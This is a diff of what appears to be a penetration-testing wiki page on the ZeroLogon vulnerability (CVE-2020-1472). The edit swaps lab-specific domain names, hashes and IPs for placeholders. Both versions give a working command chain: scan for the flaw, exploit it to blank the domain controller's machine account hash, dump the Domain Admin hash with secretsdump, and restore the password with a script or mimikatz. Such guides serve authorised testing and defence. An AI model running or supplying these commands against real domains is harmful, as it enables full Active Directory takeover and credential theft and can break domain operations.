@@ -1,4 +1,4 @@
-# 🛠️ ZeroLogon
+# 🛠️ ZeroLogon \(CVE-2020-1472\)
 
 {% hint style="danger" %}
 **This is a work-in-progress**. It's indicated with the 🛠️ emoji in the page name or in the category name
@@ -14,23 +14,23 @@ This exploit changes the NT hash of the domain controller computer account in th
 
 ```bash
 # Scan for the vulnerability (https://github.com/SecuraBV/CVE-2020-1472)
-zerologon-scan $DC_name $DC_IP_address
+zerologon-scan 'DC_name' 'DC_IP_address'
 
 # Exploit the vulnerability: set the NT hash to \x00*8 (https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py)
-zerologon-exploit $DC_name $DC_IP_address
+zerologon-exploit 'DC_name' 'DC_IP_address'
 
-# Obtain de Domain Admin's NT hash
-secretsdump -no-pass 'BREAKING.BAD/DC01$'@dc01.breaking.bad
+# Obtain the Domain Admin's NT hash
+secretsdump -no-pass 'Domain'/'DC_computer_account$'@'Domain_controller'
 
-# Obtain de machine account hex encoded password
-secretsdump -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@dc01.breaking.bad
+# Obtain the machine account hex encoded password with the domain admin credentials
+secretsdump -hashes :'NThash' 'Domain'/'Domain_admin'@'Domain_controller'
 
 # Restore the machine account password (https://github.com/dirkjanm/CVE-2020-1472/blob/master/restorepassword.py)
-zerologon-restore breaking/dc01@dc01 -target-ip 192.168.56.101 -hexpass 69762...6945d
-
+# Exemple zerologon-restore breaking/dc01@dc01 -target-ip 192.168.56.101 hexpass
+zerologon-restore 'Domain'/'DC_account'@'Domain_controller' -target-ip 'DC_IP_address' -hexpass 'DC_hexpass'
 
 # (alternate option mimikatz) Change the NT hash of the domain controller machine account in the AD back to its original value
-lsadump::changentlm /server:'DC.DOMAIN'  /user:'DC_name$' /oldntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /newntlm:<old nt hash>
+lsadump::changentlm /server:'DC.DOMAIN.LOCAL'  /user:'DC_name$' /oldntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /newntlm:'old_NThash'
 ```
 
 
